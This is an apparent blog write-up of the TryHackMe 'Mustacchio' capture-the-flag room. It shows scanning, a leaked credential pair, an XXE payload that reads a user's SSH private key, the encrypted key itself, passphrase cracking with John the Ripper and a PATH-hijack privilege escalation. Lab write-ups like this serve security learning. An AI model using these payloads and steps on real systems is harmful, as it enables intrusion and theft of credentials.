---
layout: post
title: Mustacchio CTF
published: false
---

Well hello people. This is a writeup of the Mustacchio CTF from Tryhackme. 
It was rated as a easy level box and it’s a really interesting challenge so 
without further due let’s start the hack.

![]({{site.baseurl}}/images/mustacchio/mustache.png)

Room : [Mustacchio](https://tryhackme.com/room/mustacchio)

## Nmap Scanning

>  nmap -p- IPADDR

We get the following ports open :
```
- 22 ssh
- 80 http
- 8765 ultraseek-http
```

So after scanning we know there is a website running on this machine so lets hope on to it and have a look.

![]({{site.baseurl}}/images/mustacchio/site.png)

## Go Gobuster!!!

> gobuster dir -u http://IPADDR -w /usr/share/wordlists/dirbuster/common.txt

![]({{site.baseurl}}/images/mustacchio/gobuster.png)

After the scan you can see we got some directories. Most of them are dead ends but the `custom` has a .bak file in it. After downloading it we can see that it is some sort of a SQL backup file with some credentials.

![]({{site.baseurl}}/images/mustacchio/bak.png)

After using crackstation to crack the password we get the following credentails :

```
admin
bulldog19
```

Now, lets check the 8765 port 

![]({{site.baseurl}}/images/mustacchio/login-page.png)

We get this login page. Hmm... let try those credential we just found. 

![]({{site.baseurl}}/images/mustacchio/xxe.png)

And we are in! Lets look at the source code.

![]({{site.baseurl}}/images/mustacchio/source.png)

We see these two intersting comments. The 2nd one tells us a username for the SSH login which is Barry. The 1st is looks like a path. After checking the path we get a dontforget.bak file with some XML code written in it.

## XXE

We can try to read the id_rsa file on barry from the machine by attempting binding a payload to the sample XML code we got from the dontforget.bak file

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>

  <com>&xxe;</com>
</comment>
```

And we get the id_rsa but we have to format it properly by adding spaces and line breaks otherwise it will give an error while logging it.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```


## John The Ripper

Now lets crack the id_rsa as it is requires a passpharse to login

> /opt/johnTheRipper/ssh2John.py id_rsa  hash

> john hash --wordlist=/usr/share/wordlists/rockyou.txt

And we get the passphrase : ``` urieljames```

## Loggin into SSH

After loggin in we get the user flag right away

![]({{site.baseurl}}/images/mustacchio/loginSSH.png)

## Privilege escalation

Lets look for SUIDs to exploit as it is given in the hint

> find / -perm -u=s -type f 2>/dev/null

We get a binary called live_log in joe's directory and luckily we can move into his directory as well.
After using strings on the binary file we see this interesting line

> tail -f /var/log/nginx/access.log

Intresting. Lets use this to gain root. Lets create a file named tail and make it executable and a script to get root. We also have to change the path to our file 

> echo "/bin/bash" > tail

> chmod +x tail

> export PATH=/tmp:$PATH

Now lets run the `live_log` binary.

![]({{site.baseurl}}/images/mustacchio/root.png)

And that's it. We got root. This was a fun box. Though i have to admit i had to take some hints on the way but still it was a great learning experience.



